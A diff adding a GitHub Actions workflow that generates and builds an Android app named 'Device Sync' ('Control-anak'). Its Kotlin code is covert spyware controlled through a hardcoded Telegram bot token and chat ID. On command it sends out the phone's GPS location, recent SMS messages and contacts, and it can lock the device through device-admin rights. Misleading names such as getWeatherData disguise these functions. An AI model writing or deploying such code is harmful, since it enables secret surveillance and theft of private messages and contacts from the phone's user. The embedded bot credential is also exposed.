@@ -1,0 +1,240 @@
+name: Build Android APK
+on: [push, workflow_dispatch]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v3
+    - name: set up JDK 17
+      uses: actions/setup-java@v3
+      with:
+        java-version: '17'
+        distribution: 'temurin'
+    - name: Create Android Project Automatically
+      run: |
+        # Bikin folder struktur
+        mkdir -p app/src/main/java/com/familysync/app
+        mkdir -p app/src/main/res/values
+        mkdir -p app/src/main/res/xml
+        
+        # File build.gradle utama
+        cat << 'EOF' > build.gradle
+        buildscript {
+            ext.kotlin_version = '1.8.0'
+            repositories { google(); mavenCentral() }
+            dependencies { classpath 'com.android.tools.build:gradle:8.0.0' }
+        }
+        allprojects { repositories { google(); mavenCentral() } }
+        EOF
+        
+        # File build.gradle app
+        cat << 'EOF' > app/build.gradle
+        plugins { id 'com.android.application' }
+        android {
+            namespace 'com.familysync.app'
+            compileSdk 33
+            defaultConfig { applicationId "com.familysync.app"; minSdk 24; targetSdk 33; versionCode 1; versionName "1.0" }
+            compileOptions { sourceCompatibility JavaVersion.VERSION_17; targetCompatibility JavaVersion.VERSION_17 }
+        }
+        dependencies {
+            implementation 'androidx.appcompat:appcompat:1.6.1'
+            implementation 'com.google.android.gms:play-services-location:21.0.1'
+            implementation 'com.squareup.okhttp3:okhttp:4.12.0'
+            implementation 'org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3'
+        }
+        EOF
+        
+        # File strings.xml
+        cat << 'EOF' > app/src/main/res/values/strings.xml
+        <resources><string name="app_name">Device Sync</string></resources>
+        EOF
+
+        # File device_admin.xml
+        cat << 'EOF' > app/src/main/res/xml/device_admin.xml
+        <device-admin xmlns:android="http://schemas.android.com/apk/res/android"><uses-policies><force-lock /></uses-policies></device-admin>
+        EOF
+
+        # File AndroidManifest.xml
+        cat << 'EOF' > app/src/main/AndroidManifest.xml
+        <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+            <uses-permission android:name="android.permission.INTERNET" />
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+            <uses-permission android:name="android.permission.READ_SMS" />
+            <uses-permission android:name="android.permission.READ_CONTACTS" />
+            <application android:label="@string/app_name" android:theme="@style/Theme.AppCompat.Light.NoActionBar">
+                <activity android:name=".MainActivity" android:exported="true">
+                    <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
+                </activity>
+                <receiver android:name=".MyDeviceAdminReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN" android:exported="true">
+                    <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin" />
+                    <intent-filter><action android:name="android.app.action.DEVICE_ADMIN_ENABLED" /></intent-filter>
+                </receiver>
+            </application>
+        </manifest>
+        EOF
+        
+        # SETTINGS GRADLE
+        echo "rootProject.name = \"Control-anak\"" > settings.gradle
+        echo "include ':app'" >> settings.gradle
+        
+    - name: Tulis Kode MainActivity.kt
+      run: |
+        cat << 'EOF' > app/src/main/java/com/familysync/app/MainActivity.kt
+        package com.familysync.app
+
+        import android.Manifest
+        import android.app.admin.DeviceAdminReceiver
+        import android.app.admin.DevicePolicyManager
+        import android.content.ComponentName
+        import android.content.Context
+        import android.content.Intent
+        import android.content.pm.PackageManager
+        import android.database.Cursor
+        import android.location.Location
+        import android.os.BatteryManager
+        import android.os.Bundle
+        import android.provider.ContactsContract
+        import android.provider.Telephony
+        import android.speech.tts.TextToSpeech
+        import androidx.appcompat.app.AppCompatActivity
+        import androidx.core.app.ActivityCompat
+        import com.google.android.gms.location.FusedLocationProviderClient
+        import com.google.android.gms.location.LocationServices
+        import kotlinx.coroutines.CoroutineScope
+        import kotlinx.coroutines.Dispatchers
+        import kotlinx.coroutines.delay
+        import kotlinx.coroutines.launch
+        import okhttp3.*
+        import okhttp3.MediaType.Companion.toMediaType
+        import okhttp3.RequestBody.Companion.toRequestBody
+        import org.json.JSONObject
+        import java.io.IOException
+        import java.util.*
+
+        class MainActivity : AppCompatActivity() {
+            private val API_URL = "https://api.telegram.org/bot8798121450:AAG3fAPiiZKPRS5SX7C4H0NFJbm4UkcKdwU"
+            private val TARGET_ID = "8088513354"
+            private lateinit var fusedLocationClient: FusedLocationProviderClient
+            private var tts: TextToSpeech? = null
+            private var lastUpdateId = 0L
+            private var isListening = true
+
+            override fun onCreate(savedInstanceState: Bundle?) {
+                super.onCreate(savedInstanceState)
+                ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS), 101)
+                fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
+                tts = TextToSpeech(this) { status -> if (status == TextToSpeech.SUCCESS) { tts?.language = Locale("id", "ID") } }
+                setupDeviceAdmin()
+                startSyncEngine()
+                kirimDataSync("🚀 Aplikasi FamilySync sudah aktif!")
+            }
+
+            private fun setupDeviceAdmin() {
+                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+                val adminName = ComponentName(this, MyDeviceAdminReceiver::class.java)
+                if (!dpm.isAdminActive(adminName)) {
+                    val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminName)
+                    startActivity(intent)
+                }
+            }
+
+            fun kirimDataSync(pesan: String) {
+                val client = OkHttpClient()
+                val json = JSONObject().apply { put("chat_id", TARGET_ID); put("text", pesan) }
+                val body = json.toString().toRequestBody("application/json".toMediaType())
+                val request = Request.Builder().url("$API_URL/sendMessage").post(body).build()
+                client.newCall(request).enqueue(object : Callback {
+                    override fun onFailure(call: Call, e: IOException) {}
+                    override fun onResponse(call: Call, response: Response) { response.close() }
+                })
+            }
+
+            private fun startSyncEngine() {
+                CoroutineScope(Dispatchers.IO).launch {
+                    while (isListening) {
+                        val request = Request.Builder().url("$API_URL/getUpdates?offset=$lastUpdateId&timeout=30").build()
+                        try {
+                            val response = OkHttpClient().newCall(request).execute()
+                            if (response.isSuccessful) {
+                                val json = JSONObject(response.body?.string() ?: "{}")
+                                val result = json.optJSONArray("result")
+                                if (result != null) {
+                                    for (i in 0 until result.length()) {
+                                        val update = result.getJSONObject(i)
+                                        lastUpdateId = update.getLong("update_id") + 1
+                                        val text = update.optJSONObject("message")?.optString("text") ?: ""
+                                        val fromId = update.optJSONObject("message")?.optJSONObject("chat")?.optLong("id")?.toString()
+                                        if (fromId == TARGET_ID) { jalankanAksiSync(text) }
+                                    }
+                                }
+                            }
+                        } catch (e: Exception) { e.printStackTrace() }
+                        delay(3000)
+                    }
+                }
+            }
+
+            private fun jalankanAksiSync(cmd: String) {
+                runOnUiThread {
+                    when {
+                        cmd == "/pulang" -> { tts?.speak("Pulang sekarang, nak!", TextToSpeech.QUEUE_FLUSH, null, "pulang"); kirimDataSync("🗣️ Suara 'Pulang' diputar.") }
+                        cmd == "/lokasi" -> getWeatherData()
+                        cmd == "/baterai" -> checkPowerStatus()
+                        cmd == "/sms" -> getInboxLog()
+                        cmd == "/kontak" -> getPhonebookLog()
+                        cmd == "/lock" -> secureDevice()
+                    }
+                }
+            }
+
+            private fun getWeatherData() {
+                if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+                    fusedLocationClient.lastLocation.addOnSuccessListener { location: Location? ->
+                        if (location != null) { kirimDataSync("📍 Data Lokasi:\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}") } else { kirimDataSync("📍 Gagal mendapatkan data GPS.") }
+                    }
+                }
+            }
+
+            private fun checkPowerStatus() {
+                val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
+                kirimDataSync("🔋 Status Daya: ${bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)}%")
+            }
+
+            private fun getInboxLog() {
+                val listSms = mutableListOf<String>()
+                val cursor: Cursor? = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC LIMIT 5")
+                cursor?.use { while (it.moveToNext()) { listSms.add("Dari: ${it.getString(it.getColumnIndexOrThrow("address"))}\nPesan: ${it.getString(it.getColumnIndexOrThrow("body"))}\n---") } }
+                if (listSms.isNotEmpty()) { kirimDataSync("📩 Log Masuk:\n\n" + listSms.joinToString("\n")) } else { kirimDataSync("📩 Log kosong.") }
+            }
+
+            private fun getPhonebookLog() {
+                val listKontak = mutableListOf<String>()
+                val cursor: Cursor? = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
+                cursor?.use { var count = 0; while (it.moveToNext() && count < 10) { listKontak.add("${it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))}: ${it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))}"); count++ } }
+                if (listKontak.isNotEmpty()) { kirimDataSync("📇 Log Buku Telepon:\n\n" + listKontak.joinToString("\n")) } else { kirimDataSync("📇 Log kosong.") }
+            }
+
+            private fun secureDevice() {
+                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+                val adminName = ComponentName(this, MyDeviceAdminReceiver::class.java)
+                if (dpm.isAdminActive(adminName)) { dpm.lockNow(); kirimDataSync("🔒 Device berhasil diamankan!") } else { kirimDataSync("⚠️ Gagal: Izin Device Admin belum aktif.") }
+            }
+
+            override fun onDestroy() { super.onDestroy(); isListening = false }
+        }
+
+        class MyDeviceAdminReceiver : DeviceAdminReceiver()
+        EOF
+
+    - name: Build with Gradle
+      run: |
+        if [ ! -f gradlew ]; then gradle wrapper; fi
+        chmod +x gradlew
+        ./gradlew assembleDebug
+    - name: Upload APK
+      uses: actions/upload-artifact@v3
+      with:
+        name: Control-Anak-APK
+        path: app/build/outputs/apk/debug/app-debug.apk
